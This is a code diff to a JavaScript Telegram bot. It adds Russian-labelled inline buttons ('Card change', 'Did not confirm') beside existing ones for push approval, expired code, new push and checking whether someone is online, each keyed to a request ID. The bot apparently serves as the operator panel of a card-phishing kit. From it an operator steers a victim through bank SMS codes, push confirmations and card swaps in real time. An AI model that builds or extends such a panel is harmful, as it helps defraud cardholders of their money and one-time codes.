@@ -21,7 +21,6 @@ const pending = new Map();
 
 const lastSeen = new Map();
 
-
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
   const res = await fetch(
@@ -88,6 +87,9 @@ function codeKeyboard(request_id) {
         { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
       ],
       [
+        { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
+      ],
+      [
         { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
       ],
     ],
@@ -98,14 +100,20 @@ function pushKeyboard(request_id) {
   return {
     inline_keyboard: [
       [
-        { text: "✅ Пуш прошёл",        callback_data: `${request_id}:ok`          },
-        { text: "📲 Новый пуш",          callback_data: `${request_id}:push`        },
+        { text: "✅ Пуш прошёл",        callback_data: `${request_id}:ok`             },
+        { text: "📲 Новый пуш",          callback_data: `${request_id}:push`           },
       ],
       [
-        { text: "💬 Перейти к коду",     callback_data: `${request_id}:push_code`   },
+        { text: "💬 Перейти к коду",     callback_data: `${request_id}:push_code`      },
       ],
       [
-        { text: "👁 Проверка онлайна",   callback_data: `${request_id}:check_online` },
+        { text: "↩️ Не подтверждал",     callback_data: `${request_id}:push_not_done`  },
+      ],
+      [
+        { text: "🔄 Смена карты",        callback_data: `${request_id}:change_card`    },
+      ],
+      [
+        { text: "👁 Проверка онлайна",   callback_data: `${request_id}:check_online`   },
       ],
     ],
   };
